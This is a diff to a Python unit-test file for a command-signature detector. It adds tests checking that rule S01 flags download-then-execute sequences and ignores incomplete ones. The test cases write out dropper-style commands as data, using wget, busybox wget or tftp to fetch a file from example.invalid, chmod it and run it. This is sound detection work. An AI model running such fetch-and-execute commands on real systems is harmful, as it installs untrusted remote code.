@@ -27,7 +27,30 @@ class SignatureTests(unittest.TestCase):
         for order in itertools.permutations(COMMANDS):
             with self.subTest(order=order):
                 self.assertEqual('S01' in match(self.rules, commands(order)), list(order) == COMMANDS)
+    def test_real_world_wget_variants(self):
+        cases = [
+            '(tftp -g example.invalid -r tftp -l- || busybox tftp -g example.invalid -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t',
+            '(wget http://example.invalid/p -O p); chmod 777 p; ./p',
+            '(busybox wget http://example.invalid/p -O p); chmod 777 p; ./p',
+            '(wget http://example.invalid/p -O- || busybox wget http://example.invalid/p -O-) > w; chmod 777 w; ./w; rm -rf w',
+        ]
 
+        for command in cases:
+            with self.subTest(command=command):
+                result = match(self.rules, commands([command]))
+                self.assertIn('S01', result)
+    def test_s01_incomplete_sequences(self):
+        cases = [
+            'wget http://example.invalid/p -O p; chmod +x p',
+            'wget http://example.invalid/p -O p; ./p',
+            'chmod +x p; ./p',
+            './p; chmod +x p; wget http://example.invalid/p -O p',
+        ]
+
+        for command in cases:
+            with self.subTest(command=command):
+                result = match(self.rules, commands([command]))
+                self.assertNotIn('S01', result)
     def test_compound_order_permutations(self):
         for separator in ['; ', ' && ', ' | ']:
             for order in itertools.permutations(COMMANDS):
@@ -66,7 +89,9 @@ class SignatureTests(unittest.TestCase):
         self.assertIn('S01', match(self.rules, rows))
 
     def test_legacy_rules_unchanged(self):
-        legacy = [rule for rule in self.rules if 'sequence' not in rule]
+        legacy = [rule for rule in self.rules
+                  if rule['id'] in {f'B{i:02d}' for i in range(1, 14)}
+                  | {f'C{i:02d}' for i in range(1, 6)}]
         self.assertEqual(len(legacy), 18)
         rows = commands(COMMANDS + ['uname -a', 'dota', 'chmod +x p'])
         expected = {'B08': (rows[0][0], 1), 'B11': (rows[1][0], 2),
